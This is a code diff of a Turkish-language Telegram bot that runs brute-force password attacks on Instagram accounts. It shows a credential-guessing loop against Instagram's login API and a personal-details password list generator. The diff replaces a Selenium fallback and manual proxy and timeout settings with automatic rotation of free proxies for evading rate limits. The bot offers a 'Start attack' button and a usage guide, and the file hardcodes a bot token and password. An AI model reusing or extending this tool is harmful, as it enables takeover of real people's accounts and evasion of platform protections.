@@ -10,8 +10,6 @@ import re
 import requests
 import itertools
 import os
-import subprocess
-import signal
 from typing import List, Optional
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
 from telegram.ext import (
@@ -23,15 +21,6 @@ from telegram.ext import (
     ContextTypes,
 )
 from telegram.error import TelegramError
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.common.action_chains import ActionChains
-from selenium.common.exceptions import TimeoutException, NoSuchElementException
-from webdriver_manager.chrome import ChromeDriverManager
-from selenium.webdriver.chrome.service import Service
 
 # Log ayarları
 logging.basicConfig(
@@ -50,8 +39,13 @@ TOKEN = os.getenv("BOT_TOKEN", "6481633238:AAHMT8V8nHNUsQUm69F1ngczdiFTzJAQJfU")
 # Güvenlik şifresi
 BOT_PASSWORD = os.getenv("BOT_PASSWORD", "vio1911")
 
-# Proxy API (ücretsiz proxy listesi)
-PROXY_API_URL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
+# Ücretsiz proxy API'leri (birden fazla kaynak)
+PROXY_APIS = [
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",  # ProxyScrape
+    "https://gimmeproxy.com/api/getProxy?protocol=http",  # GimmeProxy
+    "http://pubproxy.com/api/proxy?limit=20&format=txt&type=http",  # PubProxy
+    "https://api.getproxylist.com/proxy?protocol[]=http&lastTested=600"  # GetProxyList
+]
 
 # CUPP tarzı şifre oluşturucu için yapılandırma
 class PasswordGenerator:
@@ -157,21 +151,19 @@ class PasswordGenerator:
         return list(set(wordlist))[:self.max_passwords]
 
 class InstagramBruteForce:
-    def __init__(self, user_agent: str = None, proxy_list: List[str] = None):
-        self.user_agent = user_agent or self._get_realistic_user_agent()
-        self.proxy_list = proxy_list or []
+    def __init__(self):
+        self.user_agent = self._get_realistic_user_agent()
+        self.proxy_list = self._fetch_proxy_list()
         self.proxy_cache = {}
         self.proxy_cycle = itertools.cycle(self.proxy_list) if self.proxy_list else None
         self.current_proxy = None
         self.login_url = 'https://www.instagram.com/accounts/login/'
         self.api_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
         self.session = None
-        self.driver = None
         self.csrf_token = None
         self.mid_cookie = None
         self.ig_did = None
         self.rollout_hash = None
-        self.use_tor = False
         self._initialize()
 
     def _get_realistic_user_agent(self):
@@ -184,20 +176,19 @@ class InstagramBruteForce:
         return random.choice(agents)
 
     def _fetch_proxy_list(self):
-        try:
-            response = requests.get(PROXY_API_URL, timeout=10)
-            if response.status_code == 200:
-                proxies = response.text.splitlines()
-                self.proxy_list.extend([p for p in proxies if p not in self.proxy_list])
-                self.proxy_cycle = itertools.cycle(self.proxy_list)
-                logger.debug(f"Yeni proxy'ler alındı: {len(proxies)} adet")
-                return True
-            else:
-                logger.error(f"Proxy API hatası: HTTP {response.status_code}")
-                return False
-        except Exception as e:
-            logger.error(f"Proxy API hatası: {e}")
-            return False
+        proxies = set()
+        for api_url in PROXY_APIS:
+            try:
+                response = requests.get(api_url, timeout=10)
+                if response.status_code == 200:
+                    proxy_lines = response.text.splitlines()
+                    for line in proxy_lines:
+                        if ':' in line:  # IP:PORT formatı
+                            proxies.add(line.strip())
+                logger.info(f"{api_url} 'den {len(proxy_lines)} proxy alındı.")
+            except Exception as e:
+                logger.error(f"{api_url} hatası: {e}")
+        return list(proxies)
 
     def _get_working_proxy(self, progress_callback: Optional[callable] = None):
         if not self.proxy_list or not self.proxy_cycle:
@@ -228,13 +219,10 @@ class InstagramBruteForce:
                 logger.warning(f"Proxy hatası: {proxy}, {str(e)}")
             time.sleep(1)
         
-        if self._fetch_proxy_list():
-            return self._get_working_proxy(progress_callback)
-        
-        logger.error("Hiçbir proxy çalışmıyor!")
-        if progress_callback:
-            progress_callback("❌ Hiçbir proxy çalışmıyor, proxysiz devam ediliyor...")
-        return None
+        # Yeniden fetch et
+        self.proxy_list = self._fetch_proxy_list()
+        self.proxy_cycle = itertools.cycle(self.proxy_list)
+        return self._get_working_proxy(progress_callback)
 
     def _initialize(self):
         self.session = requests.Session()
@@ -246,43 +234,18 @@ class InstagramBruteForce:
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
         })
-        if self.proxy_list:
-            self.current_proxy = self._get_working_proxy()
-            if self.current_proxy:
-                self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
-
-    def _setup_selenium(self):
-        try:
-            options = Options()
-            options.add_argument('--no-sandbox')
-            options.add_argument('--disable-dev-shm-usage')
-            options.add_argument('--disable-blink-features=AutomationControlled')
-            options.add_experimental_option("excludeSwitches", ["enable-automation"])
-            options.add_experimental_option('useAutomationExtension', False)
-            options.add_argument(f'--user-agent={self.user_agent}')
-            options.add_argument('--headless=new')
-            options.add_argument('--disable-gpu')
-            
-            if self.current_proxy:
-                options.add_argument(f'--proxy-server={self.current_proxy}')
-            
-            service = Service(ChromeDriverManager().install())
-            self.driver = webdriver.Chrome(service=service, options=options)
-            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-            return True
-        except Exception as e:
-            logger.error(f"Selenium başlatılamadı: {e}")
-            return False
+        self.current_proxy = self._get_working_proxy()
+        if self.current_proxy:
+            self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
 
     async def _get_initial_cookies_and_tokens(self, progress_callback: Optional[callable] = None):
-        max_attempts = 5
+        max_attempts = 10  # Daha fazla retry
         for attempt in range(1, max_attempts + 1):
-            if self.proxy_list:
-                self.current_proxy = self._get_working_proxy(progress_callback)
-                if self.current_proxy:
-                    self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
-                else:
-                    self.session.proxies = {}
+            self.current_proxy = self._get_working_proxy(progress_callback)
+            if self.current_proxy:
+                self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
+            else:
+                self.session.proxies = {}
             
             try:
                 response = self.session.get('https://www.instagram.com/', timeout=15)
@@ -318,76 +281,7 @@ class InstagramBruteForce:
                 continue
         
         if progress_callback:
-            await progress_callback("🔍 Token bulmaya çalışıyorum (Selenium'a geçiliyor)")
-        return False
-
-    async def _selenium_get_tokens(self, progress_callback: Optional[callable] = None):
-        attempt = 1
-        while attempt <= 3:
-            if self.proxy_list:
-                self.current_proxy = self._get_working_proxy(progress_callback)
-            
-            if not self._setup_selenium():
-                if progress_callback:
-                    await progress_callback("❌ Selenium başlatılamadı, tekrar deniyorum...")
-                await asyncio.sleep(5)
-                attempt += 1
-                continue
-            
-            try:
-                self.driver.get('https://www.instagram.com/')
-                actions = ActionChains(self.driver)
-                for _ in range(random.randint(2, 5)):
-                    actions.move_by_offset(random.randint(-50, 50), random.randint(-50, 50)).pause(random.uniform(0.1, 0.5))
-                actions.perform()
-                await asyncio.sleep(random.uniform(2, 4))
-                
-                self.driver.get(self.login_url)
-                await asyncio.sleep(random.uniform(1, 3))
-                
-                try:
-                    captcha = WebDriverWait(self.driver, 5).until(
-                        EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'robot')] | //*[contains(@class, 'g-recaptcha')]"))
-                    )
-                    if captcha:
-                        if progress_callback:
-                            await progress_callback("🚨 CAPTCHA tespit edildi!")
-                        return False
-                except TimeoutException:
-                    pass
-                
-                csrf_token = self.driver.get_cookie('csrftoken')
-                if csrf_token:
-                    self.csrf_token = csrf_token['value']
-                
-                mid_cookie = self.driver.get_cookie('mid')
-                if mid_cookie:
-                    self.mid_cookie = mid_cookie['value']
-                
-                ig_did = self.driver.get_cookie('ig_did')
-                if ig_did:
-                    self.ig_did = ig_did['value']
-                
-                page_source = self.driver.page_source
-                rollout_match = re.search(r'"rollout_hash":"([^"]+)"', page_source)
-                if rollout_match:
-                    self.rollout_hash = rollout_match.group(1)
-                
-                logger.debug(f"Selenium ile token'lar alındı: CSRF={self.csrf_token}")
-                if progress_callback:
-                    await progress_callback(f"✅ Selenium ile token'lar alındı!")
-                return self.csrf_token is not None
-            except Exception as e:
-                logger.error(f"Selenium token alma hatası (Deneme {attempt}): {e}")
-                if progress_callback:
-                    await progress_callback(f"🔍 Token alma hatası, tekrar deniyorum... ({attempt})")
-                await asyncio.sleep(5)
-                attempt += 1
-            finally:
-                if self.driver:
-                    self.driver.quit()
-                    self.driver = None
-        
+            await progress_callback("❌ Token'lar alınamadı! Proxy değiştirerek tekrar deneyin.")
         return False
 
     def _make_login_request(self, username: str, password: str):
@@ -424,110 +318,17 @@ class InstagramBruteForce:
             logger.error(f"Login request hatası: {e}")
             return None
 
-    def _selenium_login_attempt(self, username: str, password: str, progress_callback: Optional[callable] = None):
-        if not self._setup_selenium():
-            return "ERROR"
-        
-        try:
-            self.driver.get(self.login_url)
-            WebDriverWait(self.driver, 10).until(
-                EC.presence_of_element_located((By.NAME, "username"))
-            )
-            
-            actions = ActionChains(self.driver)
-            for _ in range(random.randint(2, 5)):
-                actions.move_by_offset(random.randint(-50, 50), random.randint(-50, 50)).pause(random.uniform(0.1, 0.5))
-            actions.perform()
-            
-            username_field = self.driver.find_element(By.NAME, "username")
-            password_field = self.driver.find_element(By.NAME, "password")
-            
-            for char in username:
-                username_field.send_keys(char)
-                time.sleep(random.uniform(0.1, 0.3))
-            
-            time.sleep(random.uniform(0.5, 1))
-            
-            for char in password:
-                password_field.send_keys(char)
-                time.sleep(random.uniform(0.1, 0.3))
-            
-            time.sleep(random.uniform(1, 2))
-            
-            login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
-            actions.move_to_element(login_button).pause(random.uniform(0.5, 1)).click().perform()
-            time.sleep(5)
-            
-            try:
-                captcha = WebDriverWait(self.driver, 5).until(
-                    EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'robot')] | //*[contains(@class, 'g-recaptcha')]"))
-                )
-                if captcha and progress_callback:
-                    progress_callback("🚨 CAPTCHA tespit edildi!")
-                return "CAPTCHA"
-            except TimeoutException:
-                pass
-            
-            current_url = self.driver.current_url
-            page_source = self.driver.page_source
-            
-            if any(indicator in current_url for indicator in ['/', '/direct/', '/explore/', '/accounts/onetap/']):
-                if 'accounts/login' not in current_url:
-                    return "SUCCESS"
-            
-            if any(indicator in current_url for indicator in ['two_factor', '2fa']) or \
-               any(indicator in page_source for indicator in ['two_factor', 'Enter the 6-digit code']):
-                return "2FA"
-            
-            if 'checkpoint' in current_url or 'challenge' in current_url:
-                return "CHECKPOINT"
-            
-            error_indicators = [
-                'Sorry, your password was incorrect',
-                'The username you entered',
-                'incorrect',
-                'doesn\'t match',
-                'kullanıcı adı',
-                'Hatalı şifre',
-                'Şifre yanlış',
-            ]
-            
-            if any(indicator in page_source for indicator in error_indicators):
-                return "WRONG"
-            
-            try:
-                error_message = self.driver.find_element(By.XPATH, "//div[@id='error_message'] | //p[@id='slfErrorAlert'] | //div[contains(@class, 'error')]")
-                if error_message:
-                    return "WRONG"
-            except NoSuchElementException:
-                pass
-            
-            return "UNKNOWN"
-        except Exception as e:
-            logger.error(f"Selenium login hatası: {e}")
-            return "ERROR"
-        finally:
-            if self.driver:
-                self.driver.quit()
-                self.driver = None
-
-    async def brute_force(self, username: str, password_list: List[str], timeout: int, 
+    async def brute_force(self, username: str, password_list: List[str], 
                          progress_callback: Optional[callable] = None):
         start_time = time.time()
         total_passwords = len(password_list)
         potential_passwords = set()
         tried_passwords = 0
-        failed_attempts = 0
-        max_failed = 5
         
         try:
             await progress_callback(f"🚀 Instagram Brute Force Başlatılıyor\nHedef: {username}\nŞifre sayısı: {total_passwords}")
             
             success = await self._get_initial_cookies_and_tokens(progress_callback)
-            if not success:
-                await progress_callback("🔍 Token bulmaya çalışıyorum (Selenium'a geçiliyor)")
-                success = await self._selenium_get_tokens(progress_callback)
-            
             if not success:
                 await progress_callback("❌ Token'lar alınamadı!")
                 return None
@@ -535,16 +336,10 @@ class InstagramBruteForce:
             await progress_callback(f"✅ Token'lar alındı! Şifreler deneniyor...")
             
             for i, password in enumerate(password_list):
-                if time.time() - start_time > timeout:
-                    await progress_callback(f"⏰ Timeout ({timeout}s) aşıldı!")
-                    break
-                
                 if self.proxy_list and i % 10 == 0:
                     self.current_proxy = self._get_working_proxy(progress_callback)
                     if self.current_proxy:
                         self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
-                
-                await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password}")
                 
                 response = self._make_login_request(username, password)
                 result = "ERROR"
@@ -553,44 +348,33 @@ class InstagramBruteForce:
                     try:
                         json_data = response.json()
                         if json_data.get('authenticated'):
+                            result = "SUCCESS"
+                            await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                             await progress_callback(f"🎉 BAŞARILI! Şifre bulundu: {password}")
                             return password
                         elif json_data.get('authenticated') == False:
                             result = "WRONG"
                         elif json_data.get('two_factor_required'):
+                            result = "2FA"
+                            await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                             await progress_callback(f"🔐 2FA gerekli! Şifre doğru: {password}")
                             return password
                         elif json_data.get('checkpoint_url'):
+                            result = "CHECKPOINT"
+                            await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                             await progress_callback(f"🚧 Checkpoint gerekli! Şifre doğru: {password}")
                             return password
                         else:
                             result = "UNKNOWN"
                     except json.JSONDecodeError:
-                        potential_passwords.add(password)
-                        result = self._selenium_login_attempt(username, password, progress_callback)
-                else:
-                    potential_passwords.add(password)
-                    result = self._selenium_login_attempt(username, password, progress_callback)
+                        result = "ERROR"
                 
-                if result == "SUCCESS":
-                    await progress_callback(f"🎉 BAŞARILI! (Selenium) Şifre bulundu: {password}")
-                    return password
-                elif result == "2FA":
-                    await progress_callback(f"🔐 2FA gerekli! (Selenium) Şifre doğru: {password}")
-                    return password
-                elif result == "CHECKPOINT":
-                    await progress_callback(f"🚧 Checkpoint gerekli! (Selenium) Şifre doğru: {password}")
-                    return password
-                elif result == "CAPTCHA":
-                    await progress_callback("🚨 CAPTCHA tespit edildi!")
-                    return None
+                await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                 
                 tried_passwords += 1
                 
                 if (i + 1) % 5 == 0:
-                    success = await self._get_initial_cookies_and_tokens(progress_callback)
-                    if not success:
-                        await self._selenium_get_tokens(progress_callback)
+                    await self._get_initial_cookies_and_tokens(progress_callback)
                 
                 delay = random.uniform(5, 15)
                 await asyncio.sleep(delay)
@@ -618,8 +402,6 @@ class TelegramBot:
             self.user_data[user_id] = {
                 'username': None,
                 'password_file': None,
-                'proxy_file': None,
-                'timeout': 1800,
                 'password_profile': {
                     'firstname': '', 'lastname': '', 'birthdate': '',
                     'pet': '', 'company': '', 'keywords': [],
@@ -671,8 +453,6 @@ class TelegramBot:
                     [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
                     [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
                     [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
-                    [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
-                    [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
                     [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
                     [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')],
                     [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
@@ -721,42 +501,6 @@ class TelegramBot:
                     await update.message.reply_text(f"❌ Dosya işlenirken hata: {str(e)}")
             else:
                 await update.message.reply_text("❌ Lütfen bir .txt dosyası yükle!")
-
-        elif awaiting == 'proxy_file':
-            if update.message.document:
-                try:
-                    file = await update.message.document.get_file()
-                    file_path = f"proxies_{user_id}.txt"
-                    await file.download_to_drive(custom_path=file_path)
-                    
-                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                        proxies = [line.strip() for line in f if line.strip()]
-                    
-                    if not proxies:
-                        await update.message.reply_text("❌ Proxy listesi boş!")
-                        os.remove(file_path)
-                        return
-                    
-                    self.user_data[user_id]['proxy_file'] = file_path
-                    await update.message.reply_text(f"✅ Proxy listesi yüklendi! ({len(proxies)} proxy)")
-                    context.user_data['awaiting'] = None
-                    
-                except Exception as e:
-                    await update.message.reply_text(f"❌ Dosya işlenirken hata: {str(e)}")
-            else:
-                await update.message.reply_text("❌ Lütfen bir .txt dosyası yükle!")
-
-        elif awaiting == 'timeout':
-            try:
-                timeout = int(update.message.text.strip())
-                if 60 <= timeout <= 7200:
-                    self.user_data[user_id]['timeout'] = timeout
-                    await update.message.reply_text(f"✅ Timeout ayarlandı: {timeout} saniye")
-                    context.user_data['awaiting'] = None
-                else:
-                    await update.message.reply_text("❌ Timeout 60-7200 saniye arasında olmalı!")
-            except ValueError:
-                await update.message.reply_text("❌ Lütfen geçerli bir sayı gir!")
 
         elif awaiting == 'password_profile':
             try:
@@ -825,14 +569,6 @@ class TelegramBot:
             )
             context.user_data['awaiting'] = 'password_profile'
 
-        elif query.data == 'set_proxy_file':
-            await query.message.reply_text("🌐 Lütfen proxy listesi dosyasını (.txt) yükle:")
-            context.user_data['awaiting'] = 'proxy_file'
-
-        elif query.data == 'set_timeout':
-            await query.message.reply_text("⏰ Lütfen timeout süresini (saniye) gir (60-7200 arası):")
-            context.user_data['awaiting'] = 'timeout'
-
         elif query.data == 'how_to_use':
             how_to_message = """
             📖 **Bot Kullanım Kılavuzu** 📖
@@ -849,17 +585,13 @@ class TelegramBot:
                  Format: ad,soyad,doğumtarihi,evcilhayvan,şirket,anahtarkelimeler,-leet -spec -rand
                  Örnek: ahmet,yilmaz,01011990,kopek,xyz,kelime1 kelime2,-leet -spec
             
-            4. **Proxy Listesi Yükle**: (Opsiyonel) "🌐 Proxy Listesi Yükle" butonuna tıklayın ve bir proxy listesi (.txt) yükleyin.
+            4. **Saldırıyı Başlat**: "🚀 Saldırıyı Başlat" butonuna tıklayın. Bot, yüklediğiniz şifre listesini kullanarak hedef hesaba deneme yapacaktır.
             
-            5. **Timeout Ayarla**: (Opsiyonel) "⏰ Timeout Ayarla" butonuna tıklayın ve deneme süresini saniye cinsinden girin (60-7200 arası).
-            
-            6. **Saldırıyı Başlat**: "🚀 Saldırıyı Başlat" butonuna tıklayın. Bot, yüklediğiniz şifre listesini kullanarak hedef hesaba deneme yapacaktır.
-            
-            7. **İptal**: Herhangi bir anda "❌ İptal" butonuna basarak işlemi durdurabilirsiniz.
+            5. **İptal**: Herhangi bir anda "❌ İptal" butonuna basarak işlemi durdurabilirsiniz.
             
             ⚠️ **Notlar**:
             - Bot, Instagram'ın güvenlik mekanizmalarına (CAPTCHA, 2FA, checkpoint) karşı hassastır.
-            - Proxy kullanımı önerilir.
+            - Proxy'ler otomatik olarak birden fazla ücretsiz kaynaktan çekilir.
             - Oluşturulan şifre listesi otomatik olarak kaydedilir ve saldırı için kullanılabilir.
             - Botun kullanımı tamamen kullanıcının sorumluluğundadır.
             
@@ -884,7 +616,7 @@ class TelegramBot:
             return
         
         if not self.user_data[user_id]['password_file']:
-            await query.message.reply_text("❌ Önce bir şifre listesi yükle!")
+            await query.message.reply_text("❌ Önce bir şifre listesi yükle veya oluştur!")
             return
         
         try:
@@ -894,17 +626,9 @@ class TelegramBot:
             await query.message.reply_text(f"❌ Şifre listesi okunamadı: {str(e)}")
             return
         
-        proxy_list = []
-        if self.user_data[user_id]['proxy_file']:
-            try:
-                with open(self.user_data[user_id]['proxy_file'], 'r', encoding='utf-8', errors='ignore') as f:
-                    proxy_list = [line.strip() for line in f if line.strip()]
-            except Exception as e:
-                await query.message.reply_text(f"⚠️ Proxy listesi okunamadı: {str(e)}")
-        
         await query.message.reply_text(f"🚀 Saldırı başlatılıyor...\nHedef: {self.user_data[user_id]['username']}\nŞifre sayısı: {len(passwords)}")
         
-        instagram_brute = InstagramBruteForce(proxy_list=proxy_list)
+        instagram_brute = InstagramBruteForce()
         
         async def progress_callback(message):
             try:
@@ -915,7 +639,6 @@ class TelegramBot:
         result = await instagram_brute.brute_force(
             self.user_data[user_id]['username'],
             passwords,
-            self.user_data[user_id]['timeout'],
             progress_callback
         )
         
